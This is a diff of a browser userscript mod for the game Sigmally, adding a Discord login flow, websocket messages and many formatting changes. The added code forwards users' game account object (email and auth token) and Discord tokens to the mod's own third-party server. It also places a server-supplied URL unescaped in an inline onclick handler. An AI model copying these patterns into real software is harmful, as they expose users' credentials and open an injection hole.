@@ -1,6 +1,6 @@
 // ==UserScript==
 // @name         SigMod Client (Macros)
-// @version      10.1.3
+// @version      10.1.4
 // @description  The best mod you can find for Sigmally - Agar.io: Macros, Friends, tag system (minimap, chat), color mod, custom skins, AutoRespawn, save names, themes and more!
 // @author       Cursed
 // @match        https://*.sigmally.com/*
@@ -11,31 +11,21 @@
 // @namespace    https://greasyfork.org/users/981958
 // ==/UserScript==
 
-(function() {
+(function () {
     'use strict';
     const version = 10;
-    const serverVersion = '4.0.0';
+    const serverVersion = '4.0.1';
     const storageVersion = 1.0;
     const storageName = 'SigModClient-settings';
     const headerAnim = 'https://czrsd.com/static/sigmod/sigmodclient.gif';
 
-    /* Allowed by greasyfork's CDN list: https://greasyfork.org/en/help/cdns
-   * ------
-   * Chart.js: https://github.com/chartjs/Chart.js
-   * Alwan: https://github.com/sefianecho/alwan
-   * JSZip: https://github.com/Stuk/jszip
-   */
     const libs = {
-        chart: {
-            url: 'https://cdn.jsdelivr.net/npm/chart.js',
-        },
+        chart: 'https://cdn.jsdelivr.net/npm/chart.js',
         colorPicker: {
-            url: 'https://unpkg.com/alwan/dist/js/alwan.min.js',
-            css: ['https://unpkg.com/alwan/dist/css/alwan.min.css'],
+            js: 'https://unpkg.com/alwan/dist/js/alwan.min.js',
+            css: 'https://unpkg.com/alwan/dist/css/alwan.min.css',
         },
-        JSZip: {
-            url: 'https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js',
-        },
+        jszip: 'https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js',
     };
 
     const defaultSettings = {
@@ -133,21 +123,24 @@
         },
     };
 
-    let modSettings = localStorage.getItem(storageName);
-    if (!modSettings) {
+    let modSettings;
+    const stored = localStorage.getItem(storageName);
+    try {
+        modSettings = stored ? JSON.parse(stored) : defaultSettings;
+    } catch (e) {
         modSettings = defaultSettings;
-        updateStorage();
-    } else {
-        modSettings = JSON.parse(modSettings);
-
-        if (
-            !modSettings.storageVersion ||
-            modSettings.storageVersion < storageVersion
-        ) {
-            localStorage.removeItem(storageName);
-            location.reload();
-        }
     }
+
+    // really rare cases, but in case the storage structure changes completely again
+    if (
+        modSettings.storageVersion &&
+        modSettings.storageVersion !== storageVersion
+    ) {
+        localStorage.removeItem(storageName);
+        location.reload();
+    }
+
+    if (!stored) updateStorage();
 
     // intercept fetches
     let fetchedUser = 0;
@@ -183,35 +176,35 @@
 
     // Global gameSettings object to store the Sigmally WebSocket, User instance and playing status
     /*
-   * @typedef {Object} User
-   * @property {string} _id
-   * @property {number} boost
-   * @property {Object.<string, number>} cards
-   * @property {string} clan
-   * @property {string} createTime
-   * @property {string} email
-   * @property {number} exp
-   * @property {string} fullName
-   * @property {string} givenName
-   * @property {number} gold
-   * @property {string} googleID
-   * @property {number} hourlyTime
-   * @property {string} imageURL
-   * @property {any[]} lastSkinUsed
-   * @property {number} level
-   * @property {number} nextLevel
-   * @property {number} progress
-   * @property {number} seasonExp
-   * @property {Object.<string, any>} sigma
-   * @property {string[]} skins
-   * @property {number} subscription
-   * @property {string} updateTime
-   * @property {string} token
-   *
-   * @property {WebSocket} ws
-   * @property {User} user
-   * @property {boolean} isPlaying
-   */
+     * @typedef {Object} User
+     * @property {string} _id
+     * @property {number} boost
+     * @property {Object.<string, number>} cards
+     * @property {string} clan
+     * @property {string} createTime
+     * @property {string} email
+     * @property {number} exp
+     * @property {string} fullName
+     * @property {string} givenName
+     * @property {number} gold
+     * @property {string} googleID
+     * @property {number} hourlyTime
+     * @property {string} imageURL
+     * @property {any[]} lastSkinUsed
+     * @property {number} level
+     * @property {number} nextLevel
+     * @property {number} progress
+     * @property {number} seasonExp
+     * @property {Object.<string, any>} sigma
+     * @property {string[]} skins
+     * @property {number} subscription
+     * @property {string} updateTime
+     * @property {string} token
+     *
+     * @property {WebSocket} ws
+     * @property {User} user
+     * @property {boolean} isPlaying
+     */
     window.gameSettings = {
         ws: null,
         user: null,
@@ -233,7 +226,7 @@
 
     function debounce(func, delay) {
         let timeoutId;
-        return function(...args) {
+        return function (...args) {
             clearTimeout(timeoutId);
             timeoutId = setTimeout(() => {
                 func.apply(this, args);
@@ -255,7 +248,7 @@
     }
 
     function parsetxt(val) {
-        return /^(?:\{([^}]*)\})?([^]*)/.exec(val)[2].trim();
+        return /^(?:\{([^}]*)})?([^]*)/.exec(val)[2].trim();
     }
 
     // generate random string
@@ -271,11 +264,15 @@
     function RgbaToHex(code) {
         const rgbaValues = code.match(/\d+/g);
         const [r, g, b] = rgbaValues.slice(0, 3);
-        return `#${Number(r).toString(16).padStart(2, '0')}${Number(g).toString(16).padStart(2, '0')}${Number(b).toString(16).padStart(2, '0')}`;
+        return `#${Number(r).toString(16).padStart(2, '0')}${Number(g)
+            .toString(16)
+            .padStart(2, '0')}${Number(b).toString(16).padStart(2, '0')}`;
     }
 
     function bytesToHex(r, g, b) {
-        return '#' + ((1 << 24) | (r << 16) | (g << 8) | b).toString(16).slice(1);
+        return (
+            '#' + ((1 << 24) | (r << 16) | (g << 8) | b).toString(16).slice(1)
+        );
     }
 
     // --------- Game --------- //
@@ -298,7 +295,7 @@
         }
         const options = Object.values(gameMode.querySelectorAll('option'));
         const selectedOption = options.filter(
-            (option) => option.value === gameMode.value,
+            (option) => option.value === gameMode.value
         )[0];
         return selectedOption.textContent.split(' ')[0];
     }
@@ -308,7 +305,10 @@
             key: key,
             code: keycode,
         });
-        const keyUpEvent = new KeyboardEvent('keyup', { key: key, code: keycode });
+        const keyUpEvent = new KeyboardEvent('keyup', {
+            key: key,
+            code: keycode,
+        });
 
         window.dispatchEvent(keyDownEvent);
         window.dispatchEvent(keyUpEvent);
@@ -348,7 +348,9 @@
             const hours = d.getHours();
             const minutes = String(d.getMinutes()).padStart(2, '0');
             const ampm = hours >= 12 ? 'PM' : 'AM';
-            const formattedHours = (hours % 12 || 12).toString().padStart(2, '0');
+            const formattedHours = (hours % 12 || 12)
+                .toString()
+                .padStart(2, '0');
 
             return `${formattedHours}:${minutes} ${ampm}`;
         },
@@ -372,7 +374,9 @@
             } else if (hours > 0) {
                 return hours === 1 ? '1 hour ago' : `${hours} hours ago`;
             } else if (minutes > 0) {
-                return minutes === 1 ? '1 minute ago' : `${minutes} minutes ago`;
+                return minutes === 1
+                    ? '1 minute ago'
+                    : `${minutes} minutes ago`;
             } else {
                 return seconds <= 1 ? '1s>' : `${seconds}s ago`;
             }
@@ -446,22 +450,6 @@
 
         getFloat64() {
             return this.view.getFloat64((this._o += 8) - 8, this._e);
-        }
-
-        getInt16() {
-            return this.view.getInt16((this._o += 2) - 2, this._e);
-        }
-
-        getUint16() {
-            return this.view.getUint16((this._o += 2) - 2, this._e);
-        }
-
-        getUint32() {
-            return this.view.getUint32((this._o += 4) - 4, this._e);
-        }
-
-        getFloat32() {
-            return this.view.getFloat32((this._o += 4) - 4, this._e);
         }
 
         getStringUTF8(decode = true) {
@@ -576,7 +564,8 @@
             const originalSend = ws.send.bind(ws);
             ws.send = (data) => {
                 try {
-                    const arrayBuffer = data instanceof ArrayBuffer ? data : data.buffer;
+                    const arrayBuffer =
+                        data instanceof ArrayBuffer ? data : data.buffer;
                     const dataView = new DataView(arrayBuffer);
                     const reader = new Reader(dataView, 0, true);
                     const r = reader.getUint8();
@@ -595,7 +584,9 @@
                 }
             };
 
-            ws.addEventListener('message', (event) => this.handleMessage(event));
+            ws.addEventListener('message', (event) =>
+                this.handleMessage(event)
+            );
         }
 
         handleWebSocketClose() {
@@ -614,7 +605,8 @@
                 return;
             }
 
-            if (packet.build) return window.gameSettings.ws.send(packet.build());
+            if (packet.build)
+                return window.gameSettings.ws.send(packet.build());
             window.gameSettings.ws.send(packet);
         }
 
@@ -697,7 +689,7 @@
             const color = bytesToHex(
                 reader.getUint8(),
                 reader.getUint8(),
-                reader.getUint8(),
+                reader.getUint8()
             );
             let name = reader.getStringUTF8();
             const message = reader.getStringUTF8();
@@ -760,7 +752,11 @@
                 if (freezepos) {
                     if (!isHandlingFreeze) {
                         isHandlingFreeze = true;
-                        originalMove.call(this, playerPosition.x, playerPosition.y);
+                        originalMove.call(
+                            this,
+                            playerPosition.x,
+                            playerPosition.y
+                        );
                         isHandlingFreeze = false;
                     }
                     return;
@@ -796,7 +792,6 @@
             this.wsUrl = isDev
                 ? `ws://localhost:${port}/ws`
                 : 'wss://mod.czrsd.com/ws';
-            this.readyState = null;
 
             this.retries = 0;
             this.maxRetries = 4;
@@ -818,7 +813,6 @@
         }
 
         async onOpen() {
-            this.readyState = 1;
             await this.waitForDOMLoad();
 
             this.updateClientInfo();
@@ -837,10 +831,6 @@
             this.send({
                 type: 'version',
                 content: serverVersion,
-            });
-            this.send({
-                type: 'update-nick',
-                content: mods.nick,
             });
         }
 
@@ -875,7 +865,6 @@
         }
 
         onClose() {
-            this.readyState = 3;
             if (this.updateAvailable) return;
 
             this.retries++;
@@ -907,6 +896,9 @@
                     break;
                 case 'update-available':
                     this.handleUpdateAvailable(message.content);
+                    break;
+                case 'alert':
+                    mods.handleAlert(message.content);
                     break;
                 case 'tournament-preview':
                     mods.tData = message.content;
@@ -947,14 +939,16 @@
         }
 
         send(data) {
-            if (!data || this.readyState !== 1) return;
+            if (!data || this.ws.readyState !== 1) return;
             const binaryData = new TextEncoder().encode(JSON.stringify(data));
             this.ws.send(binaryData);
         }
 
         parseMessage(data) {
             try {
-                const stringData = new TextDecoder().decode(new Uint8Array(data));
+                const stringData = new TextDecoder().decode(
+                    new Uint8Array(data)
+                );
                 return JSON.parse(stringData);
             } catch (error) {
                 console.error('Failed to parse message:', error);
@@ -1014,15 +1008,15 @@
             modAlert.classList.add('modAlert');
             modAlert.innerHTML = `
                 <span>You are using an old mod version. Please update.</span>
-                <div class="flex" style="align-items: center; gap: 5px;">
-                    <button id="updateMod" class="modButton" style="width: 100%">Update</button>
+                <div class="flex centerXY g-5">
+                    <button
+                        class="modButton"
+                        style="width: 100%"
+                        onclick="window.open('${content}')"
+                    >Update</button>
                 </div>
             `;
             document.body.append(modAlert);
-
-            byId('updateMod').addEventListener('click', () => {
-                window.open(content);
-            });
         }
     }
 
@@ -1065,8 +1059,51 @@
         `;
         while (div.children.length > 0) gameSettings.append(div.children[0]);
     }
-
     addSettings();
+
+    async function checkDiscordLogin() {
+        // popup window from discord login
+        const urlParams = new URLSearchParams(window.location.search);
+        let accessToken = urlParams.get('access_token');
+        let refreshToken = urlParams.get('refresh_token');
+
+        if (!accessToken || !refreshToken) return;
+
+        const url = isDev
+            ? `http://localhost:${port}/discord/login/`
+            : 'https://mod.czrsd.com/discord/login/';
+
+        const overlay = document.createElement('div');
+        overlay.style = `position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #050505; display: flex; justify-content: center; align-items: center; z-index: 999999`;
+        overlay.innerHTML = `
+                <span style="font-size: 5rem; color: #fafafa;">Login...</span>
+            `;
+        document.body.append(overlay);
+
+        setTimeout(async () => {
+            if (refreshToken.endsWith('/')) {
+                refreshToken = refreshToken.substring(
+                    0,
+                    refreshToken.length - 1
+                );
+            } else {
+                return;
+            }
+
+            await fetch(
+                `${url}?accessToken=${accessToken}&refreshToken=${refreshToken}`,
+                {
+                    method: 'GET',
+                    credentials: 'include',
+                }
+            );
+
+            modSettings.modAccount.authorized = true;
+            updateStorage();
+            window.close();
+        }, 500);
+    }
+    checkDiscordLogin();
 
     let mods = {};
 
@@ -1076,7 +1113,7 @@
     let dead = false;
     let dead2 = false;
 
-    function mod() {
+    function Mod() {
         this.nick = null;
         this.profile = {};
         this.friends_settings = window.sigmod.friends_settings = {};
@@ -1111,7 +1148,11 @@
         this.renderedMessages = 0;
         this.maxChatMessages = 200;
         this.mutedUsers = [];
-        this.blackListCharacters = ['%EF%B7%BD', '%F0%92%90%AB', '%F0%92%88%9F'].map(decodeURIComponent);
+        this.blackListCharacters = [
+            '%EF%B7%BD',
+            '%F0%92%90%AB',
+            '%F0%92%88%9F',
+        ].map(decodeURIComponent);
 
         this.respawnCommand = '/leaveworld';
         this.aboveRespawnLimit = false;
@@ -1139,15 +1180,9 @@
 
         // for SigMod specific
         this.appRoutes = {
-            user: isDev
-                ? `http://localhost:${port}/user`
-                : 'https://mod.czrsd.com/user',
             badge: isDev
                 ? `http://localhost:${port}/badge`
                 : 'https://mod.czrsd.com/badge',
-            discordLogin: isDev
-                ? `http://localhost:${port}/discord/login/`
-                : 'https://mod.czrsd.com/discord/login/',
             signIn: (path) =>
                 isDev
                     ? `http://localhost:${port}/${path}`
@@ -1217,7 +1252,7 @@
         this.createMenu();
     }
 
-    mod.prototype = {
+    Mod.prototype = {
         get style() {
             return `
         @import url('https://fonts.googleapis.com/css2?family=Titillium+Web:wght@400;600;700&display=swap');
@@ -1804,7 +1839,7 @@
 
         .modAlert {
             position: fixed;
-            top: 80px;
+            top: 8%;
             left: 50%;
             transform: translate(-50%, -50%);
             z-index: 99995;
@@ -1815,6 +1850,7 @@
             gap: 5px;
             padding: 10px;
             color: #fff;
+            max-width: 320px;
         }
 
         .alert_overlay {
@@ -3579,7 +3615,7 @@
                 if (modSettings.game.skins.original !== null) {
                     loadSkinImage(
                         modSettings.game.skins.original,
-                        modSettings.game.skins.replacement,
+                        modSettings.game.skins.replacement
                     );
                 }
             };
@@ -3597,7 +3633,12 @@
                         if (mods.mapImageLoaded) {
                             cachedPattern = pattern;
                             ctx.fillStyle = cachedPattern;
-                            ctx.fillRect(0, 0, ctx.canvas.width, ctx.canvas.height);
+                            ctx.fillRect(
+                                0,
+                                0,
+                                ctx.canvas.width,
+                                ctx.canvas.height
+                            );
                         } else {
                             clearPattern(ctx);
                         }
@@ -3629,21 +3670,24 @@
                             0,
                             0,
                             patternCanvas.width,
-                            patternCanvas.height,
+                            patternCanvas.height
                         );
                         const data = imageData.data;
                         mods.mapImageLoaded = !Array.from(data).some(
-                            (_, i) => i % 4 === 3 && data[i] < 255,
+                            (_, i) => i % 4 === 3 && data[i] < 255
                         );
 
                         if (mods.mapImageLoaded) {
-                            resolve(ctx.createPattern(patternCanvas, 'no-repeat'));
+                            resolve(
+                                ctx.createPattern(patternCanvas, 'no-repeat')
+                            );
                         } else {
                             resolve(null);
                         }
                     };
 
-                    img.onerror = () => reject(new Error('Failed to load image.'));
+                    img.onerror = () =>
+                        reject(new Error('Failed to load image.'));
                 });
             }
 
@@ -3664,47 +3708,57 @@
 
             /* CanvasRenderingContext2D.prototype */
 
-            CanvasRenderingContext2D.prototype.fillRect = function(
+            CanvasRenderingContext2D.prototype.fillRect = function (
                 x,
                 y,
                 width,
-                height,
+                height
             ) {
-                if (this.canvas.id !== 'canvas') return fillRect.apply(this, arguments);
+                if (this.canvas.id !== 'canvas')
+                    return fillRect.apply(this, arguments);
 
                 const isCanvasSize =
-                    (width + height) / 2 === (window.innerWidth + window.innerHeight) / 2;
+                    (width + height) / 2 ===
+                    (window.innerWidth + window.innerHeight) / 2;
 
                 if (isCanvasSize) {
                     if (modSettings.game.map.image && !mods.mapImageLoaded) {
                         mods.mapImageLoaded = true;
                         updatePattern(this);
-                    } else if (!modSettings.game.map.image || !mods.mapImageLoaded) {
+                    } else if (
+                        !modSettings.game.map.image ||
+                        !mods.mapImageLoaded
+                    ) {
                         if (!isUpdatingPattern) {
                             clearPattern(this);
                         }
                     } else {
                         this.fillStyle =
-                            cachedPattern || modSettings.game.map.color || '#111111';
+                            cachedPattern ||
+                            modSettings.game.map.color ||
+                            '#111111';
                     }
                 }
 
                 fillRect.apply(this, arguments);
             };
 
-            CanvasRenderingContext2D.prototype.arc = function(
+            CanvasRenderingContext2D.prototype.arc = function (
                 x,
                 y,
                 radius,
                 startAngle,
                 endAngle,
-                anticlockwise,
+                anticlockwise
             ) {
-                if (!this.canvas.id === 'canvas') return;
+                if (this.canvas.id !== 'canvas') return;
 
                 if (radius >= 86 && modSettings.game.cellColor) {
                     this.fillStyle = modSettings.game.cellColor;
-                } else if (radius <= 20 && modSettings.game.foodColor !== null) {
+                } else if (
+                    radius <= 20 &&
+                    modSettings.game.foodColor !== null
+                ) {
                     this.fillStyle = modSettings.game.foodColor;
                     this.strokeStyle = modSettings.game.foodColor;
                 }
@@ -3712,11 +3766,17 @@
                 arc.apply(this, arguments);
             };
 
-            CanvasRenderingContext2D.prototype.fillText = function(text, x, y) {
-                if (!this.canvas.id === 'canvas') return;
+            CanvasRenderingContext2D.prototype.fillText = function (
+                text,
+                x,
+                y
+            ) {
+                if (this.canvas.id !== 'canvas') return;
 
                 const currentFontSizeMatch = this.font.match(/^(\d+)px/);
-                const fontSize = currentFontSizeMatch ? currentFontSizeMatch[0] : '';
+                const fontSize = currentFontSizeMatch
+                    ? currentFontSizeMatch[0]
+                    : '';
 
                 this.font = `${fontSize} ${modSettings.game.font || 'Ubuntu'}`;
 
@@ -3728,18 +3788,23 @@
                     this.fillStyle = modSettings.game.name.color;
                 }
 
-                if (text === mods.nick && modSettings.game.name.gradient.enabled) {
+                if (
+                    text === mods.nick &&
+                    modSettings.game.name.gradient.enabled
+                ) {
                     const width = this.measureText(text).width;
                     const fontSize = 8;
                     const gradient = this.createLinearGradient(
                         x - width / 2 + fontSize / 2,
                         y,
                         x + width / 2 - fontSize / 2,
-                        y + fontSize,
+                        y + fontSize
                     );
 
-                    const color1 = modSettings.game.name.gradient.left ?? '#ffffff';
-                    const color2 = modSettings.game.name.gradient.right ?? '#ffffff';
+                    const color1 =
+                        modSettings.game.name.gradient.left ?? '#ffffff';
+                    const color2 =
+                        modSettings.game.name.gradient.right ?? '#ffffff';
 
                     gradient.addColorStop(0, color1);
                     gradient.addColorStop(1, color2);
@@ -3762,10 +3827,14 @@
                 if (text.startsWith('X:')) {
                     this.fillStyle = 'transparent';
 
-                    const [, xValue, yValue] = /X: (.*), Y: (.*)/.exec(text) || [];
+                    const [, xValue, yValue] =
+                    /X: (.*), Y: (.*)/.exec(text) || [];
                     if (!xValue) return;
 
-                    const position = { x: parseFloat(xValue), y: parseFloat(yValue) };
+                    const position = {
+                        x: parseFloat(xValue),
+                        y: parseFloat(yValue),
+                    };
 
                     if (menuClosed() && !isDead()) {
                         if (position.x === 0 && position.y === 0) return;
@@ -3775,14 +3844,12 @@
 
                         // send position every 300 milliseconds
                         if (Date.now() - lastPosTime >= 300) {
-                            if (client.readyState === 1) {
+                            if (client?.ws?.readyState === 1) {
                                 client.send({
                                     type: 'position',
                                     content: {
                                         x: playerPosition.x,
                                         y: playerPosition.y,
-                                        nick: mods.nick,
-                                        sid: client.id,
                                     },
                                 });
                             }
@@ -3822,11 +3889,17 @@
                 fillText.apply(this, arguments);
             };
 
-            CanvasRenderingContext2D.prototype.strokeText = function(text, x, y) {
-                if (!this.canvas.id === 'canvas') return;
+            CanvasRenderingContext2D.prototype.strokeText = function (
+                text,
+                x,
+                y
+            ) {
+                if (this.canvas.id !== 'canvas') return;
 
                 const currentFontSizeMatch = this.font.match(/^(\d+)px/);
-                const fontSize = currentFontSizeMatch ? currentFontSizeMatch[0] : '';
+                const fontSize = currentFontSizeMatch
+                    ? currentFontSizeMatch[0]
+                    : '';
 
                 this.font = `${fontSize} ${modSettings.game.font || 'Ubuntu'}`;
 
@@ -3845,13 +3918,17 @@
                 strokeText.apply(this, arguments);
             };
 
-            CanvasRenderingContext2D.prototype.drawImage = function(image, ...args) {
+            CanvasRenderingContext2D.prototype.drawImage = function (
+                image,
+                ...args
+            ) {
                 if (this.canvas.id !== 'canvas')
                     return drawImage.call(this, image, ...args);
 
                 if (
                     image.src &&
-                    (image.src.endsWith('2.png') || image.src.endsWith('2-min.png')) &&
+                    (image.src.endsWith('2.png') ||
+                        image.src.endsWith('2-min.png')) &&
                     modSettings.game.virusImage
                 ) {
                     if (mods.virusImageLoaded) {
@@ -3874,7 +3951,7 @@
                     } else {
                         loadSkinImage(
                             modSettings.game.skins.original,
-                            modSettings.game.skins.replacement,
+                            modSettings.game.skins.replacement
                         ).then(() => {
                             drawImage.call(this, mods.skinImage, ...args);
                         });
@@ -3944,7 +4021,10 @@
                     resetId: 'reset-skin-image',
                     previewId: 'preview-skinImage',
                     modalId: 'skin-modal',
-                    storagePath: ['game.skins.original', 'game.skins.replacement'],
+                    storagePath: [
+                        'game.skins.original',
+                        'game.skins.replacement',
+                    ],
                     additional: true,
                 },
             };
@@ -3996,7 +4076,10 @@
 
             function setupModalEvents(id, type) {
                 byId(id).addEventListener('click', async () => {
-                    mods.customModal(createModal(modals[type]), modals[type].modalId);
+                    mods.customModal(
+                        createModal(modals[type]),
+                        modals[type].modalId
+                    );
                     document
                         .querySelector('#closeCustomModal')
                         .addEventListener('click', () => closeModal(type));
@@ -4006,12 +4089,16 @@
 
                     let initialUrl = '';
                     if (modal.additional && type === 'skin') {
-                        const [originalPath, replacementPath] = modal.storagePath;
-                        initialUrl = getNestedValue(modSettings, replacementPath) || '';
+                        const [originalPath, replacementPath] =
+                            modal.storagePath;
+                        initialUrl =
+                            getNestedValue(modSettings, replacementPath) || '';
                         byId('skin-list').value =
                             getNestedValue(modSettings, originalPath) || '';
                     } else {
-                        initialUrl = getNestedValue(modSettings, modal.storagePath) || '';
+                        initialUrl =
+                            getNestedValue(modSettings, modal.storagePath) ||
+                            '';
                     }
                     imageUrlInput.value = initialUrl;
                     updatePreview(initialUrl);
@@ -4021,10 +4108,10 @@
                     });
 
                     byId(modal.applyId).addEventListener('click', () =>
-                        applyChanges(type),
+                        applyChanges(type)
                     );
                     byId(modal.resetId).addEventListener('click', () =>
-                        resetChanges(type),
+                        resetChanges(type)
                     );
 
                     if (type === 'skin') {
@@ -4032,11 +4119,14 @@
                         const skins =
                             mods.skins.length > 0
                                 ? mods.skins
-                                : await fetch('https://one.sigmally.com/api/skins')
+                                : await fetch(
+                                    'https://one.sigmally.com/api/skins'
+                                )
                                     .then((response) => response.json())
                                     .then((data) => {
-                                        const skinNames = data.data.map((item) =>
-                                            item.name.replace('.png', ''),
+                                        const skinNames = data.data.map(
+                                            (item) =>
+                                                item.name.replace('.png', '')
                                         );
                                         mods.skins = skinNames;
                                         return skinNames;
@@ -4045,7 +4135,11 @@
                         skinList.innerHTML = skins
                             .map(
                                 (skin) =>
-                                    `<option value="${skin}" ${skin === modSettings.game.skins.original ? 'selected' : ''}>${skin}</option>`,
+                                    `<option value="${skin}" ${
+                                        skin === modSettings.game.skins.original
+                                            ? 'selected'
+                                            : ''
+                                    }>${skin}</option>`
                             )
                             .join('');
                     }
@@ -4053,7 +4147,9 @@
             }
 
             function getNestedValue(obj, path) {
-                return path.split('.').reduce((acc, part) => acc && acc[part], obj);
+                return path
+                    .split('.')
+                    .reduce((acc, part) => acc && acc[part], obj);
             }
 
             function setNestedValue(obj, path, value) {
@@ -4061,7 +4157,7 @@
                 const last = parts.pop();
                 const target = parts.reduce(
                     (acc, part) => (acc[part] = acc[part] || {}),
-                    obj,
+                    obj
                 );
                 target[last] = value;
             }
@@ -4071,8 +4167,12 @@
                 const noPreviewSpan = document.querySelector('.no-preview');
 
                 const updateVisibility = (showPreview) => {
-                    preview.style.backgroundImage = showPreview ? `url(${url})` : 'none';
-                    noPreviewSpan.style.display = showPreview ? 'none' : 'block';
+                    preview.style.backgroundImage = showPreview
+                        ? `url(${url})`
+                        : 'none';
+                    noPreviewSpan.style.display = showPreview
+                        ? 'none'
+                        : 'block';
                 };
 
                 if (url) {
@@ -4118,7 +4218,10 @@
 
                 updateStorage();
 
-                mods.modAlert(`The ${title} has been successfully reset.`, 'success');
+                mods.modAlert(
+                    `The ${title} has been successfully reset.`,
+                    'success'
+                );
             }
 
             function closeModal(type) {
@@ -4215,7 +4318,10 @@
                     overlay.style.opacity = 0;
                     setTimeout(() => {
                         overlay.remove();
-                        document.removeEventListener('click', handleClickOutside);
+                        document.removeEventListener(
+                            'click',
+                            handleClickOutside
+                        );
                     }, 300);
                 }
             };
@@ -4225,38 +4331,34 @@
 
         handleGoogleAuth(user) {
             fetchedUser++;
-
             window.gameSettings.user = user;
+            if (!client) client = new modClient();
 
-            if (!client) {
-                client = new modClient();
-            }
+            const waitForInit = () =>
+                new Promise((res) => {
+                    if (client.ws?.readyState === 1 && mods.nick)
+                        return res(null);
+                    const i = setInterval(
+                        () =>
+                            client.ws?.readyState === 1 &&
+                            mods.nick &&
+                            (clearInterval(i), res(null)),
+                        50
+                    );
+                });
 
-            if (client && client.ws) {
+            waitForInit().then(() =>
                 client.send({
                     type: 'user',
-                    content: user,
-                });
-            }
-
-            fetch(mods.appRoutes.user, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    Accept: 'application/json',
-                },
-                body: JSON.stringify({
-                    user: user,
-                    nick: mods.nick,
-                }),
-            });
+                    content: { ...user, nick: mods.nick },
+                })
+            );
 
             const claim = document.getElementById('free-chest-button');
             if (
                 fetchedUser === 1 &&
                 modSettings.settings.autoClaimCoins &&
-                claim &&
-                claim.style.display !== 'none'
+                claim?.style.display !== 'none'
             ) {
                 setTimeout(() => claim.click(), 500);
             }
@@ -4315,7 +4417,9 @@
                         </div>
                         <div class="mod_menu_content">
                             <div class="mod_tab" id="mod_home">
-                                <span class="text-center f-big" id="welcomeUser">Welcome ${this.nick || 'Guest'}, to the SigMod Client!</span>
+                                <span class="text-center f-big" id="welcomeUser">Welcome ${
+                this.nick || 'Guest'
+            }, to the SigMod Client!</span>
                                 <div class="home-card-row">
 									<!-- CARD.1 -->
 									<div class="home-card-wrapper">
@@ -4367,37 +4471,72 @@
                                                     <div class="f-column g-10">
                                                         <label class="macroRow">
                                                           <span class="text">Rapid Feed</span>
-                                                          <input type="text" name="rapidFeed" id="modinput1" class="keybinding" value="${modSettings.macros.keys.rapidFeed || ''}" maxlength="1" onfocus="this.select()" placeholder="..." />
+                                                          <input type="text" name="rapidFeed" id="modinput1" class="keybinding" value="${
+                modSettings.macros
+                    .keys
+                    .rapidFeed ||
+                ''
+            }" maxlength="1" onfocus="this.select()" placeholder="..." />
                                                         </label>
                                                         <label class="macroRow">
                                                           <span class="text">Double Split</span>
-                                                          <input type="text" name="splits.double" id="modinput2" class="keybinding" value="${modSettings.macros.keys.splits.double || ''}" maxlength="1" onfocus="this.select()" placeholder="..." />
+                                                          <input type="text" name="splits.double" id="modinput2" class="keybinding" value="${
+                modSettings.macros
+                    .keys.splits
+                    .double || ''
+            }" maxlength="1" onfocus="this.select()" placeholder="..." />
                                                         </label>
                                                         <label class="macroRow">
                                                           <span class="text">Triple Split</span>
-                                                          <input type="text" name="splits.triple" id="modinput3" class="keybinding" value="${modSettings.macros.keys.splits.triple || ''}" maxlength="1" onfocus="this.select()" placeholder="..." />
+                                                          <input type="text" name="splits.triple" id="modinput3" class="keybinding" value="${
+                modSettings.macros
+                    .keys.splits
+                    .triple || ''
+            }" maxlength="1" onfocus="this.select()" placeholder="..." />
                                                         </label>
                                                         <label class="macroRow">
                                                           <span class="text">Respawn</span>
-                                                          <input type="text" name="respawn" id="modinput16" class="keybinding" value="${modSettings.macros.keys.respawn || ''}" maxlength="1" onfocus="this.select()" placeholder="..." />
+                                                          <input type="text" name="respawn" id="modinput16" class="keybinding" value="${
+                modSettings.macros
+                    .keys
+                    .respawn || ''
+            }" maxlength="1" onfocus="this.select()" placeholder="..." />
                                                         </label>
                                                     </div>
                                                     <div class="f-column g-10">
                                                         <label class="macroRow">
                                                           <span class="text">Quad Split</span>
-                                                          <input type="text" name="splits.quad" id="modinput4" class="keybinding" value="${modSettings.macros.keys.splits.quad || ''}" maxlength="1" onfocus="this.select()" placeholder="..." />
+                                                          <input type="text" name="splits.quad" id="modinput4" class="keybinding" value="${
+                modSettings.macros
+                    .keys.splits
+                    .quad || ''
+            }" maxlength="1" onfocus="this.select()" placeholder="..." />
                                                         </label>
                                                         <label class="macroRow">
                                                           <span class="text">Horizontal Line</span>
-                                                          <input type="text" name="line.horizontal" id="modinput5" class="keybinding" value="${modSettings.macros.keys.line.horizontal || ''}" maxlength="1" onfocus="this.select()" placeholder="..." />
+                                                          <input type="text" name="line.horizontal" id="modinput5" class="keybinding" value="${
+                modSettings.macros
+                    .keys.line
+                    .horizontal ||
+                ''
+            }" maxlength="1" onfocus="this.select()" placeholder="..." />
                                                         </label>
                                                         <label class="macroRow">
                                                           <span class="text">Vertical Line</span>
-                                                          <input type="text" name="line.vertical" id="modinput8" class="keybinding" value="${modSettings.macros.keys.line.vertical || ''}" maxlength="1" onfocus="this.select()" placeholder="..." />
+                                                          <input type="text" name="line.vertical" id="modinput8" class="keybinding" value="${
+                modSettings.macros
+                    .keys.line
+                    .vertical ||
+                ''
+            }" maxlength="1" onfocus="this.select()" placeholder="..." />
                                                         </label>
                                                         <label class="macroRow">
                                                           <span class="text">Fixed Line</span>
-                                                          <input type="text" name="line.fixed" id="modinput18" class="keybinding" value="${modSettings.macros.keys.line.fixed || ''}" maxlength="1" onfocus="this.select()" placeholder="..." />
+                                                          <input type="text" name="line.fixed" id="modinput18" class="keybinding" value="${
+                modSettings.macros
+                    .keys.line
+                    .fixed || ''
+            }" maxlength="1" onfocus="this.select()" placeholder="..." />
                                                         </label>
                                                     </div>
                                                 </div>
@@ -4466,7 +4605,11 @@
                                                 <div class="stats-line justify-sb">
                                                     <span>Speed</span>
 													<div class="justify-sb g-5" style="width: 200px;">
-														<span class="mod_badge" id="macroSpeedText">${modSettings.macros.feedSpeed || '50'}ms</span>
+														<span class="mod_badge" id="macroSpeedText">${
+                modSettings.macros
+                    .feedSpeed ||
+                '50'
+            }ms</span>
 														<input
 															type="range"
 															class="modSlider"
@@ -4520,22 +4663,35 @@
 
                                                 <div class="stats-line justify-sb">
                                                     <span>Toggle Menu</span>
